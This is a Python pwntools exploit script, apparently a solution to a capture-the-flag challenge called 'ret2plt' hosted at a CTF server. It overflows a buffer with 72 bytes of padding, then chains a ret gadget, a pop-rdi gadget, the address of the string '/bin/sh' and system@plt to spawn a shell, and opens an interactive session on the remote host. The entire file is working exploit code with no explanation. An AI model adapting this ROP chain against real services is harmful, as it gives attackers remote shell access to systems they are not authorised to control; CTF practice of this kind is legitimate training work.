#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./ret2plt', checksec=False)
context.log_level = 'debug'
OFFSET_TO_RIP = 72

#p = process(elf.path)
HOST="offsec.m0lecon.it"
PORT= 13550
p= remote(HOST,PORT) 

pop_rdi = elf.sym.pop_rdi_ret
binsh = next(elf.search(b'/bin/sh\x00'))
ret = ROP(elf).find_gadget(['ret']).address

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret),
    p64(pop_rdi),
    p64(binsh),
    p64(elf.plt.system),
)

p.recvuntil(b'order?\n')
p.send(payload)
p.interactive()
